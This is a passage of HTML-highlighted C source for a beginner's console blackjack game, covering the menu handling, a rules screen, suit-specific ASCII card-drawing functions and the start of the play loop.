</span><br><span class="line">                   play();</span><br><span class="line">                                       </span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// Case to see rules</span></span><br><span class="line">                   system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">                   rules();</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// Case to exit game</span></span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">&quot;\nYour day could have been perfect.&quot;</span>);</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">&quot;\nHave an almost perfect day!\n\n&quot;</span>);</span><br><span class="line">                   system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">                   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">&quot;\nInvalid Input&quot;</span>);</span><br><span class="line">            &#125; <span class="comment">// End switch case</span></span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">&#x27;N&#x27;</span>) || (choice1 == <span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nYour day could have been perfect.&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nHave an almost perfect day!\n\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span> <span class="comment">//Prints &quot;Rules of Vlad&#x27;s Blackjack&quot; list</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> choice1;</span><br><span class="line">     <span class="keyword">int</span> choice2;</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n           RULES of VLAD&#x27;s BLACKJACK&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n          ---------------------------&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nI.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     Thou shalt not question the odds of this game.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c This program generates cards at random.&quot;</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c If you keep losing, you are very unlucky!\n&quot;</span>, diamond);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nII.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     Each card has a value.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c Number cards 1 to 10 hold a value of their number.&quot;</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c J, Q, and K cards hold a value of 10.&quot;</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c Ace cards hold a value of 11&quot;</span>, club);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     The goal of this game is to reach a card value total of 21.\n&quot;</span>);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nIII.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c Staying will keep you safe, hitting will add a card.&quot;</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     Because you are competing against the dealer, you must beat his hand.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     BUT BEWARE!.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c If your total goes over 21, you will LOSE!.&quot;</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     But the world is not over, because you can always play again.\n&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n&quot;</span>, spade, heart, club, club, heart, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nWould you like to go the previous screen? (I will not take NO for an answer)&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n                  (Y/N)\n                    &quot;</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;\n%c&quot;</span>,&amp;choice1);</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">while</span>((choice1!=<span class="string">&#x27;Y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;N&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Incorrect Choice. Please Enter Y for Yes or N for No.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">&#x27;Y&#x27;</span>) || (choice1 == <span class="string">&#x27;y&#x27;</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">            system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">            asktitle();</span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">&#x27;N&#x27;</span>) || (choice1 == <span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If no, convinces user to enter yes</span></span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n                 I told you so.\n&quot;</span>);</span><br><span class="line">        asktitle();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span> <span class="comment">//Displays Club Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  %d  |\n&quot;</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  J  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  A  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line"> </span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  Q  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  K  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;           </span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span> <span class="comment">//Displays Diamond Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  %d  |\n&quot;</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  J  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  A  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  Q  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  K  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span> <span class="comment">//Displays Heart Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  %d  |\n&quot;</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  J  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  A  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  Q  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  K  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span> <span class="comment">//Displays Spade Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  %d  |\n&quot;</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  J  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  A  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  Q  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  K  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span> <span class="comment">//Generates random card</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">                </span><br><span class="line">     srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">     random_card = rand()%<span class="number">4</span>+<span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">1</span>)</span><br><span class="line">     &#123;   </span><br><span class="line">         clubcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">2</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         diamondcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">3</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         heartcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">          </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">4</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         spadecard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;    </span><br><span class="line">     <span class="keyword">return</span> l;</span><br><span class="line">&#125; <span class="comment">// End Function   </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> <span class="comment">//Plays game</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">int</span> p=<span class="number">0</span>; <span class="comment">// holds value of player_total</span></span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">1</span>; <span class="comment">// counter for asking user to hold or stay (aka game turns)</span></span><br><span class="line">     <span class="keyword">char</span> choice3;</span><br><span class="line">      </span><br><span class="line">     cash = cash;</span><br><span class="line">     cash_test();</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nCash: $%d\n&quot;</span>,cash); <span class="comment">//Prints amount of cash user has</span></span><br><span class="line">     randcard(); <span class="comment">//Generates random card</span></span><br><span class="line">     player_total = p + l; <span class="comment">//Computes player total</span></span><br><span class="line">     p = player_total;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nYour Total is %d\n&quot;</span>, p); <span class="comment">//Prints player total</span></span><br><span class="line">     dealer(); <span class="comment">//Computes and prints 